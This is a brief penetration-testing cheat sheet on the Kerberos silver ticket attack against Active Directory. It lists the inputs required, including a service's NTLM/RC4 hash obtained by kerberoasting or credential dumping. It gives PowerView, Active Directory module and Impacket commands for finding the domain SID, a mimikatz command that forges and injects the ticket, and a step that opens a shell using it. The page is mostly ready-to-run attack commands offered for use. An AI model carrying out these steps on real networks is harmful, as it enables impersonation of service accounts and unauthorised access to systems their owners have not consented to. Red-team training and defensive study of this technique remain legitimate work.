# Silver Ticket Attack

With the NTLM hash of a service account, you can create a ticket that can be used to impersonate that service account across the domain.

## Required pieces of information

1. The name of the user account to impersonate
    * Doesn't have to be a real user account
    * i.e., Administrator
2. The name of the domain
    * i.e., hydra.test
3. The SID of the domain
    * i.e., S-1-5-21-849420856-2351964222-986696166
4. The fully qualified domain name of the server
    * i.e., hydra-ws01.marvel.test
5. The target service name
    * i.e., SQLService
6. The NTLM/RC4 password hash of the target service
    * Obtainable via kerberoasting, SAM dump, secretsdump, etc.

## (PowerView) Obtain domain SID

```powershell
Get-DomainSID
```

## (Active Directory PowerShell Module) Obtain Domain SID

```powershell
Get-ADDomain
```

## (Impacket) Obtain Domain SID

```bash
lookupsid.py
```

## (Mimikatz) Create and Use the Silver Ticket

```powershell
mimikatz: kerberos::golden /user:$USER_TO_IMPERSONATE /domain:$DOMAIN /sid:$DOMAIN_SID /target:$FQDN_TARGET_SERVER /service:$TARGET_SERVICE_NAME /rc4:$NTLM_OR_RC4_HASH /ptt
```

Open up a new command prompt that leverages the silver ticket (must be in a GUI session to access the new command prompt).

```powershell
mimikatz: misc:cmd
```

## [(Impacket) Create and Use the Silver Ticket](https://yojimbosecurity.ninja/golden-ticket-with-impacket/)

* This method will need to be modified slightly for **silver** tickets.
